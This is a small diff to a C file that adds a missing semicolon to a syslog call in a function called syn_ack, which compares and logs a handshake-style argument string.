@@ -72,7 +72,7 @@ int syn_ack(char* arguments,int syn,int fd){
         }
         else if(strcmp(arguments,SYN1)){
             if(syn) return 0;
-            syslog(LOG_INFO,"argument: %s, SYN1: %s", arguments, SYN1)
+            syslog(LOG_INFO,"argument: %s, SYN1: %s", arguments, SYN1);
         }
         else strcpy(arguments,"it's the ping of death for you my friend!");
         /* Now execute the commands in a new session*/
